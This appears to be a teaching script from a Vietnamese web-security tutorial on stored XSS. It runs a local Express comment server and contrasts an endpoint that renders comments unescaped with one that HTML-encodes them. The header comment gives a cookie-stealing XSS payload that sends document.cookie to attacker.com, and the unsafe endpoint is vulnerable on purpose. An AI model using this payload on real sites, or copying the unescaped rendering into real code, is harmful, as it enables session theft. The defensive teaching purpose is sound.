// Bài viết: 2025-02-28-Web-Bi-Hack-Qua-SQL-va-Command-Injection — mục 4.1 (Stored XSS)
//
//   node injection/xss-stored.js
//   curl -s -X POST http://localhost:4006/comment --data-urlencode \
//     'comment=<img src=x onerror="fetch(`https://attacker.com/steal?c=`+document.cookie)">'
//   curl -s http://localhost:4006/posts-unsafe   # -> payload nằm nguyên trong HTML
//   curl -s http://localhost:4006/posts-safe      # -> payload đã bị encode
//
// Câu INSERT dùng '?' nên KHÔNG dính SQL Injection. Nhưng lỗ hổng nằm ở bước render:
// /posts-unsafe ghép thẳng c.text vào HTML, /posts-safe encode trước khi ghép.

//  Lưu thành `xss-stored.js` (`npm install express`, Node ≥ 22.5)
const express = require("express");
const { DatabaseSync } = require("node:sqlite");

const db = new DatabaseSync(":memory:");
db.exec("CREATE TABLE comments (id INTEGER PRIMARY KEY, text TEXT)");

function escapeHtml(text) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#039;",
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

const app = express();
app.use(express.urlencoded({ extended: false }));

app.post("/comment", (req, res) => {
  db.prepare("INSERT INTO comments (text) VALUES (?)").run(req.body.comment);
  res.type("text").send("Đã lưu comment\n");
});

// ❌ Render thẳng comment, không encode — script trong DB chạy trên trình duyệt nạn nhân
app.get("/posts-unsafe", (req, res) => {
  const comments = db.prepare("SELECT text FROM comments").all();
  res.type("html").send(comments.map((c) => `<p>${c.text}</p>`).join(""));
});

// ✅ Encode khi render — ký tự HTML hiển thị như text thường
app.get("/posts-safe", (req, res) => {
  const comments = db.prepare("SELECT text FROM comments").all();
  res
    .type("html")
    .send(comments.map((c) => `<p>${escapeHtml(c.text)}</p>`).join(""));
});

app.listen(4006);
